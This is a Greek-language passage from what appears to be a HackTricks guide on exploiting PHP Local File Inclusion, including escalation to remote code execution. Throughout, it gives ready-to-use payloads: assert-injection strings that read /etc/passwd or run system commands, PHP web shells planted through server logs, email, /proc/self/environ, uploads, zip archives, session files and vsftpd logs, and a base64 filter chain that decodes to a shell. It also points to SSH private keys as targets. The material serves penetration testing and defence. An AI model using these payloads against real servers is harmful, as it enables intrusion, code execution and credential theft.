* [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό σύστημα αρχείων
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε διευθύνσεις URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε διευθύνσεις URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Ροές Συμπίεσης
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Εύρεση ονομάτων αρχείων που ταιριάζουν με ένα πρότυπο (Δεν επιστρέφει κάτι εκτυπώσιμο, οπότε δεν είναι πραγματικά χρήσιμο εδώ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Ασφαλής Κέλυφος 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ροές Ήχου (Δεν είναι χρήσιμο για την ανάγνωση αυθαίρετων αρχείων)

## LFI μέσω της 'assert' του PHP

Οι κίνδυνοι της Τοπικής Συμπερίληψης Αρχείων (LFI) στο PHP είναι ιδιαίτερα υψηλοί όταν ασχολούμαστε με τη λειτουργία 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε συμβολοσειρές. Αυτό είναι ιδιαίτερα προβληματικό εάν ελέγχεται είσοδος που περιέχει χαρακτήρες διάσχισης καταλόγου όπως ".." αλλά δεν αποσαφηνίζεται σωστά.

Για παράδειγμα, ο κώδικας PHP μπορεί να έχει σχεδιαστεί για να αποτρέψει τη διάσχιση καταλόγου ως εξής:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ενώ αυτό στοχεύει στο να σταματήσει τη διάβαση, αθέλητα δημιουργεί ένα διάνυσμα για ενσωμάτωση κώδικα. Για να εκμεταλλευτεί αυτό για την ανάγνωση περιεχομένων αρχείου, ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Επίσης, για την εκτέλεση αυθαίρετων εντολών συστήματος, κάποιος θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
Είναι σημαντικό να **κωδικοποιήσετε τις φορτώσεις αυτές με URL**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξετάζει την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορα εξελισσόμενο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανταμοιβές ευρημάτων και κρίσιμες ενημερώσεις πλατφόρμας

**Συμμετέχετε μαζί μας στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

## Τυφλή Διάβαση Διαδρομής PHP

{% hint style="warning" %}
Αυτή η τεχνική είναι σχετική σε περιπτώσεις όπου **ελέγχετε** τη **διαδρομή αρχείου** ενός **PHP λειτουργίας** που θα **έχει πρόσβαση σε ένα αρχείο** αλλά δεν θα δείτε το περιεχόμενο του αρχείου (όπως ένα απλό κάλεσμα στο **`file()`**) αλλά το περιεχόμενο δεν εμφανίζεται.
{% endhint %}

Στο [**αυτήν την απίστευτη ανάρτηση**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) εξηγείται πώς μια τυφλή διάβαση διαδρομής μπορεί να καταχραστεί μέσω PHP φίλτρου για **εξαγωγή του περιεχομένου ενός αρχείου μέσω ενός oracle σφάλματος**.

Ως περίληψη, η τεχνική χρησιμοποιεί την κωδικοποίηση **"UCS-4LE"** για να κάνει το περιεχόμενο ενός αρχείου τόσο **μεγάλο** ώστε η **PHP λειτουργία που ανοίγει** το αρχείο θα ενεργοποιήσει ένα **σφάλμα**.

Στη συνέχεια, για να διαρρεύσει το πρώτο χαρακτήρα, χρησιμοποιείται το φίλτρο **`dechunk`** μαζί με άλλα όπως **base64** ή **rot13** και τελικά τα φίλτρα **convert.iconv.UCS-4.UCS-4LE** και **convert.iconv.UTF16.UTF-16BE** χρησιμοποιούνται για να **τοποθετήσουν άλλους χαρακτήρες στην αρχή και να τους διαρρεύσουν**.

**Λειτουργίες που μπορεί να είναι ευάλωτες**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (μόνο στόχος ανάγνωσης με αυτό)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τεχνικές λεπτομέρειες ελέγξτε την αναφερόμενη ανάρτηση!

## LFI2RCE

### Απομακρυσμένη Συμπερίληψη Αρχείου

Όπως εξηγήθηκε προηγουμένως, [**ακολουθήστε αυτόν το σύνδεσμο**](./#remote-file-inclusion).

### Μέσω αρχείου καταγραφής Apache/Nginx

Εάν ο διακομιστής Apache ή Nginx είναι **ευάλωτος στην LFI** μέσα στη λειτουργία συμπερίληψης, μπορείτε να προσπαθήσετε να έχετε πρόσβαση στα **`/var/log/apache2/access.log` ή `/var/log/nginx/access.log`**, να ορίσετε μέσα στο **user agent** ή μέσα σε ένα **GET παράμετρο** ένα php shell όπως **`<?php system($_GET['c']); ?>`** και να συμπεριλάβετε αυτό το αρχείο

{% hint style="warning" %}
Σημειώστε ότι **αν χρησιμοποιήσετε διπλά εισαγωγικά** για το shell αντί για **απλά εισαγωγικά**, τα διπλά εισαγωγικά θα τροποποιηθούν σε "_**quote;**_", **το PHP θα εκτοξεύσει ένα σφάλμα** εκεί και **τίποτα άλλο δεν θα εκτελεστεί**.

Επίσης, βεβαιωθείτε ότι **γράφετε σωστά τη φορτώση** αλλιώς το PHP θα εμφανίσει σφάλμα κάθε φορά που προσπαθεί να φορτώσει το αρχείο καταγραφής και δεν θα έχετε μια δεύτερη ευκαιρία.
{% endhint %}

Αυτό θα μπορούσε επίσης να γίνει σε άλλα αρχεία καταγραφής, αλλά **προσέξτε,** ο κώδικας μέσα στα αρχεία καταγραφής θα μπορούσε να είναι κωδικοποιημένος με URL και αυτό θα μπορούσε να καταστρέψει το Shell. Η κεφαλίδα **authorisation "basic"** περιέχει "user:password" σε Base64 και αποκωδικοποιείται μέσα στα αρχεία καταγραφής. Το PHPShell θα μπορούσε να εισαχθεί μέσα σε αυτήν την κεφαλίδα.\
Άλλοι πιθανοί δρόμοι αρχείων καταγραφής:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing λίστα λέξεων: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Μέσω Email

**Στείλτε ένα email** σε ένα εσωτερικό λογαριασμό (user@localhost) περιέχοντας το PHP payload σας όπως `<?php echo system($_REQUEST["cmd"]); ?>` και προσπαθήστε να το συμπεριλάβετε στο email του χρήστη με ένα μονοπάτι όπως **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Μέσω /proc/\*/fd/\*

1. Μεταφορτώστε πολλά shells (π.χ.: 100)
2. Συμπεριλάβετε [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διαδικασίας (μπορεί να εξαναγκαστεί) και $FD τον περιγραφέα αρχείου (μπορεί να εξαναγκαστεί επίσης)

### Μέσω /proc/self/environ

Όπως ένα αρχείο καταγραφής, στείλτε το payload στο User-Agent, θα αντανακλαστεί μέσα στο αρχείο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Μέσω μεταφόρτωσης

Εάν μπορείτε να μεταφορτώσετε ένα αρχείο, απλά ενσωματώστε το φορτίο του κέλυφους μέσα σε αυτό (π.χ.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### Μέσω μεταφόρτωσης αρχείου Zip

Μεταφορτώστε ένα αρχείο ZIP που περιέχει ένα συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω των συνεδριών PHP

Ελέγξτε εάν η ιστοσελίδα χρησιμοποιεί τις συνεδρίες PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στην PHP αυτές οι συνεδρίες αποθηκεύονται στα αρχεία _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ορίστε το cookie σε `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποιήστε το LFI για να συμπεριλάβετε το αρχείο συνεδρίας PHP.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Εάν το ssh είναι ενεργό, ελέγξτε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και δοκιμάστε να έχετε πρόσβαση στο **\<HOME>/.ssh/id\_rsa**

### **Μέσω** **vsftpd** _**logs**_

Τα logs για τον FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Στην περίπτωση όπου υπάρχει μια ευπαθής ευκαιρία για Τοπική Ενσωμάτωση Αρχείου (LFI), και η πρόσβαση σε ένα εκτεθέμενο διακομιστή vsftpd είναι δυνατή, μπορούν να ληφθούν υπόψη τα ακόλουθα βήματα:

1. Εισαγωγή ενός PHP payload στο πεδίο ονόματος χρήστη κατά τη διαδικασία σύνδεσης.
2. Μετά την εισαγωγή, χρησιμοποιήστε το LFI για να ανακτήσετε τα logs του διακομιστή από το _**/var/log/vsftpd.log**_.

### Μέσω php base64 φίλτρου (χρησιμοποιώντας base64)

Όπως φαίνεται σε [αυτό](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) άρθρο, το PHP base64 φίλτρο αγνοεί απλά τα μη base64. Μπορείτε να χρησιμοποιήσετε αυτό για να παρακάμψετε τον έλεγχο της κατάληξης του αρχείου: αν παρέχετε base64 που τελειώνει με ".php", απλά θα αγνοήσει το "." και θα προσθέσει το "php" στο base64. Εδώ υπάρχει ένα παράδειγμα payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Μέσω φίλτρων php (χωρίς την ανάγκη αρχείου)

Αυτό το [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) εξηγεί ότι μπορείτε να χρησιμοποιήσετε **φίλτρα php για τη δημιουργία αυθαίρετου περιεχομένου** ως έξοδο. Αυτό σημαίνει βασικά ότι μπορείτε να **δημιουργήσετε αυθαίρετο κώδικα php** για την περιλαμβάνει **χωρίς την ανάγκη να τον γράψετε** σε ένα αρχείο.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Μέσω σφάλματος διαχωρισμού

**Μεταφορτώστε** ένα αρχείο που θα αποθηκευτεί ως **προσωρινό** στο `/tmp`, στη συνέχεια στο **ίδιο αίτημα,** προκαλέστε ένα **σφάλμα διαχωρισμού** και έπειτα το **προσωρινό αρχείο δεν θα διαγραφεί** και μπορείτε να το αναζητήσετε.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Μέσω αποθήκευσης αρχείων temp του Nginx

Αν βρήκατε μια **Τοπική Συμπερίληψη Αρχείου** και το **Nginx** τρέχει μπροστά από το PHP, μπορείτε να καταφέρετε να αποκτήσετε RCE με την ακόλουθη τεχνική:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Μέσω PHP\_SESSION\_UPLOAD\_PROGRESS

Αν βρήκατε μια **Τοπική Συμπερίληψη Αρχείου** ακόμα κι αν **δεν έχετε μια συνεδρία** και το `session.auto_start` είναι `Off`. Αν παρέχετε το **`PHP_SESSION_UPLOAD_PROGRESS`** στα **multipart POST** δεδομένα, το PHP θα **ενεργοποιήσει τη συνεδρία για εσάς**. Μπορείτε να εκμεταλλευτείτε αυτό για να πάρετε RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session_upload_progress.md)
{% endcontent-ref %}

### Μέσω μεταφορτώσεων προσωρινών αρχείων σε Windows

Αν βρήκατε μια **Τοπική Συμπερίληψη Αρχείου** και ο διακομιστής τρέχει σε **Windows** μπορείτε να αποκτήσετε RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Μέσω phpinfo() (file\_uploads = on)

Αν βρήκατε μια **Τοπική Συμπερίληψη Αρχείου** και ένα αρχείο που εκθέτει **phpinfo()** με file\_uploads = on μπορείτε να αποκτήσετε RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Μέσω compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Αποκάλυψη Διαδρομής

Αν βρήκατε μια **Τοπική Συμπερίληψη Αρχείου** και μπορείτε να εξαγάγετε τη διαδρομή του προσωρινού αρχείου ΑΛΛΑ ο **διακομιστής** ελέγχει αν το **αρχείο που θα συμπεριληφθεί έχει σήματα PHP**, μπορείτε να δοκιμάσετε να **παρακάμψετε αυτόν τον έλεγχο** με αυτήν τη **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Μέσω αιώνιας αναμονής + βίαιης επίθεσης

Αν μπορείτε να εκμεταλλευτείτε την LFI για **μεταφορτώσεις προσωρινών αρχείων** και να κάνετε τον διακομιστή να **κολλήσει** την εκτέλεση του PHP, τότε θα μπορούσατε να **δοκιμάσετε ονόματα αρχείων με βία** για ώρες για να βρείτε το προσωρινό αρχείο:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Σε Καταστροφικό Σφάλμα

Αν συμπεριλάβετε οποιοδήποτε από τα αρχεία `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Πρέπει να συμπεριλάβετε το ίδιο δύο φορές για να προκαλέσετε αυτό το σφάλμα).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά μπορεί να είναι.**\
_Ακόμα κι αν προκαλέσετε ένα Καταστροφικό Σφάλμα PHP, τα προσωρινά αρχεία που μεταφορτώθηκαν διαγράφονται._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Αναφορές

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Συμμετάσχετε στο [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγές Χάκερ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκερ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέα βραβεία ευρετηρίων ευρημάτων και κρίσιμες ενημερώσεις πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε** 💬 στην ομάδα [**Discord**](https://discord.gg/hRep4RUj7f) ή στην ομάδα [**telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
